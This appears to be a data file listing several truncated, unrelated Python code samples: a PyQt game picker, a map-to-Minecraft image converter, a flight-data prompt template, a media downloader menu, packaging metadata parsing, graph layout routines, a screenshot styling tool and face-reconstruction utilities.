\u0634\u0631\u064a\u0637 \u0627\u0644\u0639\u0646\u0648\u0627\u0646\n            title_bar = StandardTitleBar(self)\n            self.setTitleBar(title_bar)\n            # \u0625\u062e\u0641\u0627\u0621 \u0623\u0632\u0631\u0627\u0631 \u0627\u0644\u062a\u0643\u0628\u064a\u0631 \u0648\u0627\u0644\u062a\u0635\u063a\u064a\u0631\n            title_bar.maxBtn.hide()  # \u0625\u062e\u0641\u0627\u0621 \u0632\u0631 \u0627\u0644\u062a\u0643\u0628\u064a\u0631\n            title_bar.minBtn.hide() # \u0625\u062e\u0641\u0627\u0621 \u0632\u0631 \u0627\u0644\u062a\u0635\u063a\u064a\u0631\n            title_bar.setDoubleClickEnabled(False)  # \u062a\u0639\u0637\u064a\u0644 \u0627\u0644\u062a\u0643\u0628\u064a\u0631 \u0628\u0627\u0644\u0646\u0642\u0631 \u0627\u0644\u0645\u0632\u062f\u0648\u062c\n            title_label = QLabel(\"FC Rollback Tool - Select Game\")\n            title_label.setStyleSheet(\"color: white; background-color: transparent; font-size: 16px; padding-left: 5px;\")\n            title_label.setAlignment(Qt.AlignLeft)\n            title_label.setAttribute(Qt.WA_TransparentForMouseEvents, True)\n            title_bar_layout.addWidget(title_label)\n            self.main_layout.addLayout(title_bar_layout)\n        except Exception as e:\n            self.handle_error(f\"Error creating title bar: {e}\")\n\n    def create_table(self):\n        try:\n            self.table = TableWidget(self)\n            self.table.setBorderVisible(True)\n            self.table.setBorderRadius(2)\n            self.table.setWordWrap(False)\n            self.table.setIconSize(QSize(32, 32))\n            self.table.setColumnCount(2)\n            self.table.setHorizontalHeaderLabels([\"Name\", \"Path\"])\n            self.table.setSelectionMode(QAbstractItemView.SingleSelection)\n            self.table.setSelectionBehavior(QAbstractItemView.SelectRows)\n            header = self.table.horizontalHeader()\n            header.setSectionResizeMode(QHeaderView.ResizeToContents)\n            header.setStretchLastSection(True)\n            QTimer.singleShot(0, lambda: header.setSectionResizeMode(QHeaderView.Interactive))\n            self.table.setAlternatingRowColors(False)\n            self.table.verticalHeader().hide()\n            # \u0631\u0628\u0637 \u0627\u0644\u0646\u0642\u0631 \u0627\u0644\u0645\u0632\u062f\u0648\u062c \u0628\u062f\u0627\u0644\u0629 handle_select_button\n            self.table.itemDoubleClicked.connect(lambda _: self.handle_select_button())\n            self.stacked_layout.addWidget(self.table)\n            self.populate_table()\n        except Exception as e:\n            self.handle_error(f\"Error creating table: {e}\")\n\n    def create_spinner(self):\n        try:\n            self.spinner_container = QWidget(self)\n            layout = QVBoxLayout(self.spinner_container)\n            layout.setAlignment(Qt.AlignCenter)\n            layout.setContentsMargins(0, 0, 0, 0)\n\n            self.spinner_container.setStyleSheet(\"background-color: transparent;\")\n\n            self.spinner_widget = LoadingSpinner(self)\n            self.spinner_widget.setStyleSheet(\"background-color: tran",
    "import requests\r\nfrom PIL import Image\r\nimport numpy as np\r\nfrom io import BytesIO\r\nimport os\r\nfrom scipy.ndimage import gaussian_filter, binary_dilation\r\nimport random\r\n\r\ndef get_google_maps_snapshot(lat, lng, api_key, zoom=18, size=(640, 640)):\r\n    \"\"\"\r\n    Fetch a snapshot from the Google Maps Static API.\r\n\r\n    Args:\r\n    - lat (float): Latitude of the center point.\r\n    - lng (float): Longitude of the center point.\r\n    - api_key (str): Google Maps API key.\r\n    - zoom (int): Zoom level for the map.\r\n    - size (tuple): Size of the map image.\r\n\r\n    Returns:\r\n    - PIL.Image.Image: The fetched map image.\r\n    \"\"\"\r\n    base_url = \"https://maps.googleapis.com/maps/api/staticmap?\"\r\n    scale = 2  # High-resolution scale\r\n\r\n    # Style parameter to hide labels and text\r\n    style = [\r\n        \"feature:all|element:labels|visibility:off\",  # Remove all labels\r\n        \"feature:poi|element:labels|visibility:off\",  # Remove points of interest labels\r\n        \"feature:road|element:labels|visibility:off\",  # Remove road labels\r\n    ]\r\n\r\n    # Combine styles into a string for the URL\r\n    style_param = \"&\".join([f\"style={s}\" for s in style])\r\n\r\n    params = {\r\n        \"center\": f\"{lat},{lng}\",\r\n        \"zoom\": zoom,\r\n        \"size\": f\"{size[0]}x{size[1]}\",\r\n        \"scale\": scale,\r\n        \"maptype\": \"default\",\r\n        \"key\": api_key\r\n    }\r\n\r\n    # Append the styles to the URL\r\n    response = requests.get(base_url + style_param, params=params)\r\n    if response.status_code == 200:\r\n        return Image.open(BytesIO(response.content))\r\n    else:\r\n        raise Exception(f\"Error: {response.status_code}, {response.text}\")\r\n\r\ndef convert_to_minecraft_palette(image, max_distance=30):\r\n    \"\"\"\r\n    Convert image colors to a Minecraft-like palette by mapping each pixel to the closest palette color,\r\n    and apply depth algorithm to water areas.\r\n\r\n    Args:\r\n    - image (PIL.Image.Image): The input image.\r\n    - max_distance (float): The maximum color distance to consider for mapping.\r\n\r\n    Returns:\r\n    - PIL.Image.Image: The transformed image.\r\n    \"\"\"\r\n    # Minecraft color palette\r\n    # Original color -> Mapped Minecraft color\r\n    palette = {\r\n        'grass': ((211, 248, 226), (108, 152, 47)),    # Light green -> Grass green\r\n        'water': ((144, 218, 238), (64, 63, 252)),     # Light blue -> Water blue\r\n        'light_grey': ((233, 234, 239), (205, 127, 55)),  # Light grey -> Brown\r\n        # Add more mappings if needed\r\n    }\r\n\r\n    # Extract the palette colors and their corresponding Minecraft colors\r\n    original_colors = np.array([color[0] for color in palette.values()])\r\n    minecraft_colors = np.array([color[1] for color in palette.values()])\r\n\r\n    # Ensure the image is in RGB mode\r\n    if image.mode != 'RGB':\r\n        image = image.convert('RGB')\r\n\r\n    # Convert the image to a NumPy array\r\n    image_array = np.array(image)\r\n\r\n    # Reshape the image array to a 2D array of pixels\r\n    pixels = image_array.reshape(-1, 3)\r\n\r\n    # Compute the distance between each pixel and each color in the palette\r\n    distances = np.linalg.norm(pixels[:, None] - original_colors[None, :], axis=2)\r\n\r\n    # Find the minimum distance and the index of the closest palette color for each pixel\r\n    min_distances = np.min(distances, axis=1)\r\n    closest_color_indices = np.argmin(distances, axis=1)\r\n\r\n    # Create a mask for pixels within the max_distance\r\n    within_distance = min_distances <= max_distance\r\n\r\n    # Map pixels within the threshold to the closest Minecraft color\r\n    new_pixels = pixels.copy()\r\n    new_pixels[within_distance] = minecraft_colors[closest_color_indices[within_distance]]\r\n\r\n    # Reshape the new pixels back to the original image shape\r\n    new_image_array = new_pixels.reshape(image_array.shape)\r\n\r\n    # Now process the water areas\r\n    new_image_array = process_water_areas(new_image_array, palette)\r\n\r\n    # Convert the modified array back to a PIL image\r\n    return Image.fromarray(new_image_array.astype('uint8'))\r\n\r\ndef process_water_areas(image_array, palette):\r\n    \"\"\"\r\n    Process water areas to assign depths and apply patterns.\r\n\r\n    Args:\r\n    - image_array (numpy.ndarray): The image array after initial color mapping.\r\n    - palette (dict): The color palette used for mapping.\r\n\r\n    Returns:\r\n    - numpy.ndarray: The modified image array with water depths applied.\r\n    \"\"\"\r\n    # Extract Minecraft water color\r\n    minecraft_water_color = np.array(palette['water'][1])\r\n\r\n    # Define colors for deep water\r\n    deep_water_color = np.array([0, 0, 139])  # Darker blue for deep water\r\n\r\n    # Create a mask for water pixels\r\n    water_mask = np.all(image_array == minecraft_water_color, axis=-1)\r\n\r\n    # Create a depth map for water pixels (default 0 for shallow)\r\n    depth_map = np.zeros(image_array.shape[:2], dtype=int)\r\n\r\n    # Ensure shoreline is shallow\r\n    # First, identify shoreline pixels (water pixels adjacent to non-water pixels)\r\n    structure = np.ones((3, 3))\r\n    dilated_water_mas",
    "from langchain.prompts import PromptTemplate\n\nresponse_prompt = PromptTemplate(\n    input_variables=[\"question\", \"sql_query\", \"query_result\"],\n    template=\"\"\"\nAnalyze flight data based on the following:\n\nQuery: {question}\nSQL Query: {sql_query}\nResults: {query_result}\n\nInstructions:\n- First check if query_result is empty or None. If so, respond with \"No flight data available for this query.\"\n- If data exists, create a markdown table ONLY with columns present in the data.\n- Format prices with \u20b9 and comma separators.\n- If round-trip data is provided and the total price is specified, calculate outbound and return prices as half the total price (unless explicitly provided).\n- Ensure the \"Total Price\" is displayed accurately and is NOT doubled.\n- If only one-way data is available, exclude return and total price columns.\n- Highlight the cheapest option in the table using bold formatting for the row.\n- Provide a concise summary of key findings ONLY if data exists.\n\nResponse Format:\nIf no data is found:\nNo flight data available for this query.\n\nIf data exists and both outbound and return flights are available:\n### Flight Details\n\n| Date (Outbound) | Date (Return) | Airline | Origin | Destination | Departure Time (Outbound) | Duration (Outbound) | Return Time | Duration (Return) | Outbound Price (\u20b9) | Return Price (\u20b9) | Total Price (\u20b9) |\n|------------------|---------------|---------|--------|-------------|---------------------------|---------------------|-------------|-------------------|---------------------|------------------|-----------------|\n| [actual data]    | [actual data] | ...     | ...    | ...         | ...                       | ...                 | ...         | ...               | \u20b9...,...            | \u20b9...,...         | \u20b9...,...         |\n\nIf data exists and only one-way flights are available:\n### Flight Details\n\n| Date | Airline | Origin | Destination | Departure Time | Duration | Flight Type | Price (\u20b9) |\n|------|---------|--------|-------------|----------------|----------|-------------|-----------|\n| [actual data]  | ...     | ...    | ...         | ...            | ...      | ...         | \u20b9...,...  |\n\n**Summary:** [Concise overview of flight options, ONLY if data exists]\n\nNote: All data displayed must be exclusively from the query_result. No placeholder or example data should be shown.\n\"\"\"\n)\n\n",
    "import http.cookiejar\nimport re\nimport os\nimport json\nimport signal\nimport shutil\nimport time\nimport requests\nfrom colorama import Fore, Style, init\nfrom modules.cookies import load_cookies\nfrom modules.iq import (\n    fetch_html, \n    get_album_id, \n    get_episodes, \n    get_series_title, \n    get_title, \n    download_media,\n    download_subtitles,\n    get_video_m3u8\n)\nfrom modules.banners import banners, clear_screen\nfrom modules.logging import setup_logging\n\n# Initialize Colorama\ninit(autoreset=True)\nlogger = setup_logging(\"MAIN\")\n\ndef display_menu(title, options):\n    \"\"\"Display a formatted menu and return the user's choice.\"\"\"\n    print(f\"\\n{Fore.CYAN}{'=' * 40}\")\n    print(f\"{Fore.YELLOW}{title.center(40)}\")\n    print(f\"{Fore.CYAN}{'=' * 40}\")\n    \n    for idx, option in enumerate(options, start=1):\n        print(f\"{Fore.GREEN}[{idx}] {Fore.WHITE}{option}\")\n    print(f\"{Fore.CYAN}{'=' * 40}\")\n\n    try:\n        choice = int(input(f\"{Fore.MAGENTA}\\nEnter your choice: {Style.RESET_ALL}\"))\n        if choice < 1 or choice > len(options):\n            raise ValueError\n    except ValueError:\n        print(f\"{Fore.RED}\\n\u26a0\ufe0f Invalid input. Please try again.{Style.RESET_ALL}\")\n        return display_menu(title, options)\n    \n    return choice\n\ndef choose_lang():\n    \"\"\"Prompt the user to select a language.\"\"\"\n    logger.debug(\"Prompting user for language selection.\")\n    options = [\n        \"English\", \"Simplified Chinese\", \"Traditional Chinese\", \"Bahasa Indonesia\", \n        \"Bahasa Malaysia\", \"Thai\", \"Vietnamese\", \"Japanese\", \"Portugu\u00eas\", \"Espa\u00f1ol\"\n    ]\n    choice = display_menu(\"Language Selection\", options)\n    languages = ['en_us', 'zh_cn', 'zh_tw', 'id_id', 'ms_my', 'th_th', 'vi_vn', 'ja', 'pt_br', 'es_mx']\n    selected_lang = languages[choice - 1]\n    print(f\"\\n{Fore.GREEN}\u2705 Selected language: {Fore.WHITE}{options[choice - 1]}{Style.RESET_ALL}\")\n    return selected_lang\n\ndef choose_res():\n    \"\"\"Prompt the user to select a resolution.\"\"\"\n    logger.debug(\"Prompting user for resolution selection.\")\n    options = [\"1080p\", \"720p\", \"480p\", \"360p\"]\n    choice = display_menu(\"Resolution Selection\", options)\n    resolutions = [600, 400, 300, 200]\n    selected_res = resolutions[choice - 1]\n    print(f\"\\n{Fore.GREEN}\u2705 Selected resolution: {Fore.WHITE}{options[choice - 1]}{Style.RESET_ALL}\")\n    return selected_res\n\ndef main():\n    \"\"\"Main function to run the media downloader.\"\"\"\n    print(f\"\\n{Fore.MAGENTA}\u2728 Welcome to the Media Downloader \u2728{Style.RESET_ALL}\\n\")\n    print(f\"{Fore.YELLOW}Follow the prompts to configure your download preferences.{Style.RESET_ALL}\\n\")\n\n    # Step 1: Language selection\n    lang = choose_lang()\n    logger.info(f\"Selected language: {lang}\")\n    clear_screen()\n    banners()\n\n    res = choose_res()\n    logger.info(f\"Selected resolution: {res}p\")\n    clear_screen()\n    banners()\n\n    print(f\"\\n{Fore.CYAN}\ud83d\udca1 Example URL: {Fore.WHITE}https://example.com/media{Style.RESET_ALL}\")\n    url = input(f\"{Fore.MAGENTA}\ud83d\udd17 Enter the media URL: {Style.RESET_ALL}\").strip().replace(\"album\", \"play\")\n    logger.info(f\"Input URL: {url}\")\n    clear_screen()\n    banners()\n\n    print(f\"\\n{Fore.YELLOW}\ud83d\udd04 Loading cookies and fetching content...{Style.RESET_ALL}\")\n    \n    try:\n        cookies = load_cookies(\"cookies/cookies.txt\")\n        base_html = fetch_html(url, res, lang, cookies)\n        episodes = get_episodes(base_html, lang)\n        if episodes:\n            series_title = get_series_title(base_html)  # Fixed the function call to get series title\n            print(f\"{Fore.YELLOW}Series Title: {Fore.WHITE}{series_title}{Style.RESET_ALL}\")\n            if input(f\"\\n{Fore.MAGENTA}Do you want to download the entire series? (y/n): {Style.RESET_ALL}\").strip().lower() == \"y\":\n                for episode_url in episodes:\n                    episode_html = fetch_html(episode_url, res, lang, cookies)\n                    title = get_title(episode_html)\n                    get_video_m3u8(episode_html)\n                    download_media(series_title, title)\n                    download_subtitles(episode_html, series_title, title)\n                    print(f\"\\n{Fore.CYAN}\ud83d\udcc2 Downloading media... {Fore.WHITE}{title}{Style.RESET_ALL}\")\n            else:\n                logger.info(\"Skipping series download.\")\n        else:\n            title = get_title(base_html)\n            get_video_m3u8(base_html)\n            download_media(title, title)\n            download_subtitles(base_html, title, title)\n            print(f\"\\n{Fore.GREEN}\u2705 Download complete! Check your output folder.{Style.RESET_ALL}\")\n    except Exception as e:\n        logger.error(f\"An error occurred during download: {e}\")\n        print(f\"\\n{Fore.RED}\u274c An error occurred during the download process. Please try again.{Style.RESET_ALL}\")\n\nif __name__ == \"__main__\":\n    clear_screen()\n    banners()\n    main()",
    "from __future__ import annotations\n\nimport email.feedparser\nimport email.header\nimport email.message\nimport email.parser\nimport email.policy\nimport pathlib\nimport sys\nimport typing\nfrom typing import (\n    Any,\n    Callable,\n    Generic,\n    Literal,\n    TypedDict,\n    cast,\n)\n\nfrom . import licenses, requirements, specifiers, utils\nfrom . import version as version_module\nfrom .licenses import NormalizedLicenseExpression\n\nT = typing.TypeVar(\"T\")\n\n\nif sys.version_info >= (3, 11):  # pragma: no cover\n    ExceptionGroup = ExceptionGroup\nelse:  # pragma: no cover\n\n    class ExceptionGroup(Exception):\n        \"\"\"A minimal implementation of :external:exc:`ExceptionGroup` from Python 3.11.\n\n        If :external:exc:`ExceptionGroup` is already defined by Python itself,\n        that version is used instead.\n        \"\"\"\n\n        message: str\n        exceptions: list[Exception]\n\n        def __init__(self, message: str, exceptions: list[Exception]) -> None:\n            self.message = message\n            self.exceptions = exceptions\n\n        def __repr__(self) -> str:\n            return f\"{self.__class__.__name__}({self.message!r}, {self.exceptions!r})\"\n\n\nclass InvalidMetadata(ValueError):\n    \"\"\"A metadata field contains invalid data.\"\"\"\n\n    field: str\n    \"\"\"The name of the field that contains invalid data.\"\"\"\n\n    def __init__(self, field: str, message: str) -> None:\n        self.field = field\n        super().__init__(message)\n\n\n# The RawMetadata class attempts to make as few assumptions about the underlying\n# serialization formats as possible. The idea is that as long as a serialization\n# formats offer some very basic primitives in *some* way then we can support\n# serializing to and from that format.\nclass RawMetadata(TypedDict, total=False):\n    \"\"\"A dictionary of raw core metadata.\n\n    Each field in core metadata maps to a key of this dictionary (when data is\n    provided). The key is lower-case and underscores are used instead of dashes\n    compared to the equivalent core metadata field. Any core metadata field that\n    can be specified multiple times or can hold multiple values in a single\n    field have a key with a plural name. See :class:`Metadata` whose attributes\n    match the keys of this dictionary.\n\n    Core metadata fields that can be specified multiple times are stored as a\n    list or dict depending on which is appropriate for the field. Any fields\n    which hold multiple values in a single field are stored as a list.\n\n    \"\"\"\n\n    # Metadata 1.0 - PEP 241\n    metadata_version: str\n    name: str\n    version: str\n    platforms: list[str]\n    summary: str\n    description: str\n    keywords: list[str]\n    home_page: str\n    author: str\n    author_email: str\n    license: str\n\n    # Metadata 1.1 - PEP 314\n    supported_platforms: list[str]\n    download_url: str\n    classifiers: list[str]\n    requires: list[str]\n    provides: list[str]\n    obsoletes: list[str]\n\n    # Metadata 1.2 - PEP 345\n    maintainer: str\n    maintainer_email: str\n    requires_dist: list[str]\n    provides_dist: list[str]\n    obsoletes_dist: list[str]\n    requires_python: str\n    requires_external: list[str]\n    project_urls: dict[str, str]\n\n    # Metadata 2.0\n    # PEP 426 attempted to completely revamp the metadata format\n    # but got stuck without ever being able to build consensus on\n    # it and ultimately ended up withdrawn.\n    #\n    # However, a number of tools had started emitting METADATA with\n    # `2.0` Metadata-Version, so for historical reasons, this version\n    # was skipped.\n\n    # Metadata 2.1 - PEP 566\n    description_content_type: str\n    provides_extra: list[str]\n\n    # Metadata 2.2 - PEP 643\n    dynamic: list[str]\n\n    # Metadata 2.3 - PEP 685\n    # No new fields were added in PEP 685, just some edge case were\n    # tightened up to provide better interoptability.\n\n    # Metadata 2.4 - PEP 639\n    license_expression: str\n    license_files: list[str]\n\n\n_STRING_FIELDS = {\n    \"author\",\n    \"author_email\",\n    \"description\",\n    \"description_content_type\",\n    \"download_url\",\n    \"home_page\",\n    \"license\",\n    \"license_expression\",\n    \"maintainer\",\n    \"maintainer_email\",\n    \"metadata_version\",\n    \"name\",\n    \"requires_python\",\n    \"summary\",\n    \"version\",\n}\n\n_LIST_FIELDS = {\n    \"classifiers\",\n    \"dynamic\",\n    \"license_files\",\n    \"obsoletes\",\n    \"obsoletes_dist\",\n    \"platforms\",\n    \"provides\",\n    \"provides_dist\",\n    \"provides_extra\",\n    \"requires\",\n    \"requires_dist\",\n    \"requires_external\",\n    \"supported_platforms\",\n}\n\n_DICT_FIELDS = {\n    \"project_urls\",\n}\n\n\ndef _parse_keywords(data: str) -> list[str]:\n    \"\"\"Split a string of comma-separated keywords into a list of keywords.\"\"\"\n    return [k.strip() for k in data.split(\",\")]\n\n\ndef _parse_project_urls(data: list[str]) -> dict[str, str]:\n    \"\"\"Parse a list of label/URL string pairings separated by a comma.\"\"\"\n    urls = {}\n    for pair in data:\n        # Our logic is slightly tricky here as we want to try and do\n        # *something* reasonable with",
    "\"\"\"Assign coordinates to the nodes of a graph.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport numpy as np\nimport param\nimport scipy.sparse\n\n\nclass LayoutAlgorithm(param.ParameterizedFunction):\n    \"\"\"\n    Baseclass for all graph layout algorithms.\n    \"\"\"\n\n    __abstract = True\n\n    seed = param.Integer(default=None, bounds=(0, 2**32-1), doc=\"\"\"\n        Random seed used to initialize the pseudo-random number\n        generator.\"\"\")\n\n    x = param.String(default='x', doc=\"\"\"\n        Column name for each node's x coordinate.\"\"\")\n\n    y = param.String(default='y', doc=\"\"\"\n        Column name for each node's y coordinate.\"\"\")\n\n    source = param.String(default='source', doc=\"\"\"\n        Column name for each edge's source.\"\"\")\n\n    target = param.String(default='target', doc=\"\"\"\n        Column name for each edge's target.\"\"\")\n\n    weight = param.String(default=None, allow_None=True, doc=\"\"\"\n        Column name for each edge weight. If None, weights are ignored.\"\"\")\n\n    id = param.String(default=None, allow_None=True, doc=\"\"\"\n        Column name for a unique identifier for the node.  If None, the\n        dataframe index is used.\"\"\")\n\n    def __call__(self, nodes, edges, **params):\n        \"\"\"\n        This method takes two dataframes representing a graph's nodes\n        and edges respectively. For the nodes dataframe, the only\n        column accessed is the specified `id` value (or the index if\n        no 'id'). For the edges dataframe, the columns are `id`,\n        `source`, `target`, and (optionally) `weight`.\n\n        Each layout algorithm will use the two dataframes as appropriate to\n        assign positions to the nodes. Upon generating positions, this\n        method will return a copy of the original nodes dataframe with\n        two additional columns for the x and y coordinates.\n        \"\"\"\n        return NotImplementedError\n\n\nclass random_layout(LayoutAlgorithm):\n    \"\"\"\n    Assign coordinates to the nodes randomly.\n\n    Accepts an edges argument for consistency with other layout algorithms,\n    but ignores it.\n    \"\"\"\n\n    def __call__(self, nodes, edges=None, **params):\n        p = param.ParamOverrides(self, params)\n\n        np.random.seed(p.seed)\n\n        df = nodes.copy()\n        points = np.asarray(np.random.random((len(df), 2)))\n\n        df[p.x] = points[:, 0]\n        df[p.y] = points[:, 1]\n\n        return df\n\n\nclass circular_layout(LayoutAlgorithm):\n    \"\"\"\n    Assign coordinates to the nodes along a circle.\n\n    The points on the circle can be spaced either uniformly or randomly.\n\n    Accepts an edges argument for consistency with other layout algorithms,\n    but ignores it.\n    \"\"\"\n\n    uniform = param.Boolean(True, doc=\"\"\"\n        Whether to distribute nodes evenly on circle\"\"\")\n\n    def __call__(self, nodes, edges=None, **params):\n        p = param.ParamOverrides(self, params)\n\n        np.random.seed(p.seed)\n\n        r = 0.5  # radius\n        x0, y0 = 0.5, 0.5  # center of unit circle\n        circumference = 2 * np.pi\n\n        df = nodes.copy()\n\n        if p.uniform:\n            thetas = np.arange(circumference, step=circumference/len(df))\n        else:\n            thetas = np.asarray(np.random.random((len(df),))) * circumference\n\n        df[p.x] = x0 + r * np.cos(thetas)\n        df[p.y] = y0 + r * np.sin(thetas)\n\n        return df\n\n\ndef _extract_points_from_nodes(nodes, params, dtype=None):\n    if params.x in nodes.columns and params.y in nodes.columns:\n        points = np.asarray(nodes[[params.x, params.y]])\n    else:\n        points = np.asarray(np.random.random((len(nodes), params.dim)), dtype=dtype)\n    return points\n\n\ndef _convert_graph_to_sparse_matrix(nodes, edges, params, dtype=None, format='csr'):\n    nlen = len(nodes)\n    if params.id is not None and params.id in nodes:\n        index = dict(zip(nodes[params.id].values, range(nlen)))\n    else:\n        index = dict(zip(nodes.index.values, range(nlen)))\n\n    if params.weight and params.weight in edges:\n        edge_values = edges[[params.source, params.target, params.weight]].values\n        rows, cols, data = zip(*((index[src], index[dst], weight)\n                                 for src, dst, weight in edge_values\n                                 if src in index and dst in index))\n    else:\n        edge_values = edges[[params.source, params.target]].values\n        rows, cols, data = zip(*((index[src], index[dst], 1)\n                                 for src, dst in edge_values\n                                 if src in index and dst in index))\n\n    # Symmetrize matrix\n    d = data + data\n    r = rows + cols\n    c = cols + rows\n\n    # Check for nodes pointing to themselves\n    loops = edges[edges[params.source] == edges[params.target]]\n    if len(loops):\n        if params.weight and params.weight in edges:\n            loop_values = loops[[params.source, params.target, params.weight]].values\n            diag_index, diag_data = zip(*((index[src], -weight)\n                                          for src, dst, weight in loop_values\n         ",
    "#!/usr/bin/env python3\n\nimport os\nimport subprocess\nfrom datetime import datetime\nfrom PIL import Image, ImageDraw, ImageFilter, ImageColor\n\nimport tkinter as tk\nfrom tkinter import ttk, filedialog, colorchooser, messagebox\n\n########################################\n# Image processing functions\n########################################\n\ndef round_corners(img, radius=30):\n    \"\"\"Adds rounded corners to the given image.\"\"\"\n    width, height = img.size\n    mask = Image.new(\"L\", (width, height), 0)\n    draw = ImageDraw.Draw(mask)\n\n    # Draw rectangles\n    draw.rectangle([radius, 0, width - radius, height], fill=255)\n    draw.rectangle([0, radius, width, height - radius], fill=255)\n\n    # Draw corner arcs\n    draw.pieslice([0, 0, 2 * radius, 2 * radius], 180, 270, fill=255)  # top-left\n    draw.pieslice([width - 2*radius, 0, width, 2*radius], 270, 360, fill=255)  # top-right\n    draw.pieslice([0, height - 2*radius, 2*radius, height], 90, 180, fill=255)  # bottom-left\n    draw.pieslice([width - 2*radius, height - 2*radius, width, height], 0, 90, fill=255)  # bottom-right\n\n    img.putalpha(mask)\n    return img\n\ndef add_shadow(\n    img,\n    offset=(10, 10),\n    background_color=(0,0,0,0),\n    shadow_color=(0,0,0,80),\n    border=50,\n    iterations=5\n):\n    \"\"\"Adds a blurred shadow behind the given image.\"\"\"\n    total_width = img.size[0] + abs(offset[0]) + border*2\n    total_height = img.size[1] + abs(offset[1]) + border*2\n\n    shadow = Image.new(\"RGBA\", (total_width, total_height), background_color)\n    shadow_x = border + max(offset[0], 0)\n    shadow_y = border + max(offset[1], 0)\n\n    shadow_draw = ImageDraw.Draw(shadow)\n    alpha_mask = img.split()[-1]\n    shadow_draw.bitmap((shadow_x, shadow_y), alpha_mask, fill=shadow_color)\n\n    for _ in range(iterations):\n        shadow = shadow.filter(ImageFilter.BLUR)\n\n    # Paste original image over shadow\n    shadow.paste(img, (border, border), img)\n    return shadow\n\n########################################\n# Main Application (Tkinter GUI)\n########################################\n\nclass ScreenshotApp(tk.Tk):\n    def __init__(self):\n        super().__init__()\n\n        self.title(\"Beautiful Screenshot Tool\")\n        self.geometry(\"400x250\")\n\n        # Default directory (dynamic). Try ~/Pictures/screenshots or fallback to ~/Pictures\n        home_dir = os.path.expanduser(\"~\")\n        default_dir = os.path.join(home_dir, \"Pictures\", \"screenshots\")\n        if not os.path.isdir(default_dir):\n            # If ~/Pictures/screenshots doesn't exist, use ~/Pictures\n            default_dir = os.path.join(home_dir, \"Pictures\")\n\n        self.screenshot_directory = tk.StringVar(value=default_dir)\n        self.bg_color = \"#263238\"  # default background color (dark grey)\n\n        # Create UI\n        self.create_widgets()\n\n    def create_widgets(self):\n        # Directory selection\n        dir_label = ttk.Label(self, text=\"Screenshot Directory:\")\n        dir_label.pack(pady=5)\n\n        dir_frame = ttk.Frame(self)\n        dir_frame.pack(pady=5)\n        dir_entry = ttk.Entry(dir_frame, textvariable=self.screenshot_directory, width=40)\n        dir_entry.pack(side=tk.LEFT, padx=5)\n        dir_button = ttk.Button(dir_frame, text=\"Browse...\", command=self.choose_directory)\n        dir_button.pack(side=tk.LEFT)\n\n        # Choose color\n        color_label = ttk.Label(self, text=\"Background Color:\")\n        color_label.pack(pady=5)\n\n        color_frame = ttk.Frame(self)\n        color_frame.pack(pady=5)\n        color_button = ttk.Button(color_frame, text=\"Pick a Color\", command=self.pick_color)\n        color_button.pack(side=tk.LEFT, padx=5)\n        self.color_preview = ttk.Label(color_frame, text=\"  \", background=self.bg_color)\n        self.color_preview.pack(side=tk.LEFT, padx=5, ipady=5, ipadx=15)\n\n        # Take screenshot\n        screenshot_button = ttk.Button(\n            self, text=\"Take Screenshot\", command=self.take_screenshot\n        )\n        screenshot_button.pack(pady=20)\n\n    def choose_directory(self):\n        \"\"\"Let user pick a directory for storing screenshots.\"\"\"\n        chosen_dir = filedialog.askdirectory(initialdir=self.screenshot_directory.get())\n        if chosen_dir:\n            self.screenshot_directory.set(chosen_dir)\n\n    def pick_color(self):\n        \"\"\"Open the color chooser dialog to pick a background color.\"\"\"\n        color_tuple = colorchooser.askcolor(color=self.bg_color)\n        if color_tuple and color_tuple[1] is not None:\n            # color_tuple = ((r, g, b), \"#rrggbb\")\n            self.bg_color = color_tuple[1]\n            self.color_preview.configure(background=self.bg_color)\n\n    def take_screenshot(self):\n        \"\"\"Capture screenshot with maim, round corners, add shadow, apply background.\"\"\"\n        # Ensure directory exists\n        out_dir = self.screenshot_directory.get()\n        if not os.path.exists(out_dir):\n            try:\n                os.makedirs(out_dir, exist_ok=True)\n            except OSError as e:\n                messagebox.showerror(\"Error\"",
    "# Copyright (c) 2025 JD.com, Inc. and affiliates.\n# \n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n# \n#     https://www.apache.org/licenses/LICENSE-2.0\n# \n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# This file contains code from Deep3DFaceRecon_pytorch (Copyright (c) 2022 Sicheng Xu),\n# licensed under the MIT License, available at https://github.com/sicxu/Deep3DFaceRecon_pytorch.\n\n\"\"\"This script contains basic utilities for Deep3DFaceRecon_pytorch\n\"\"\"\nfrom __future__ import print_function\nimport numpy as np\nimport torch\nfrom PIL import Image\ntry:\n    from PIL.Image import Resampling\n    RESAMPLING_METHOD = Resampling.BICUBIC\nexcept ImportError:\n    from PIL.Image import BICUBIC\n    RESAMPLING_METHOD = BICUBIC\nimport os\nimport importlib\nimport argparse\nfrom argparse import Namespace\nimport torchvision\n\n\ndef str2bool(v):\n    if isinstance(v, bool):\n        return v\n    if v.lower() in ('yes', 'true', 't', 'y', '1'):\n        return True\n    elif v.lower() in ('no', 'false', 'f', 'n', '0'):\n        return False\n    else:\n        raise argparse.ArgumentTypeError('Boolean value expected.')\n\n\ndef copyconf(default_opt, **kwargs):\n    conf = Namespace(**vars(default_opt))\n    for key in kwargs:\n        setattr(conf, key, kwargs[key])\n    return conf\n\ndef genvalconf(train_opt, **kwargs):\n    conf = Namespace(**vars(train_opt))\n    attr_dict = train_opt.__dict__\n    for key, value in attr_dict.items():\n        if 'val' in key and key.split('_')[0] in attr_dict:\n            setattr(conf, key.split('_')[0], value)\n\n    for key in kwargs:\n        setattr(conf, key, kwargs[key])\n\n    return conf\n        \ndef find_class_in_module(target_cls_name, module):\n    target_cls_name = target_cls_name.replace('_', '').lower()\n    clslib = importlib.import_module(module)\n    cls = None\n    for name, clsobj in clslib.__dict__.items():\n        if name.lower() == target_cls_name:\n            cls = clsobj\n\n    assert cls is not None, \"In %s, there should be a class whose name matches %s in lowercase without underscore(_)\" % (module, target_cls_name)\n\n    return cls\n\n\ndef tensor2im(input_image, imtype=np.uint8):\n    \"\"\"\"Converts a Tensor array into a numpy image array.\n\n    Parameters:\n        input_image (tensor) --  the input image tensor array, range(0, 1)\n        imtype (type)        --  the desired type of the converted numpy array\n    \"\"\"\n    if not isinstance(input_image, np.ndarray):\n        if isinstance(input_image, 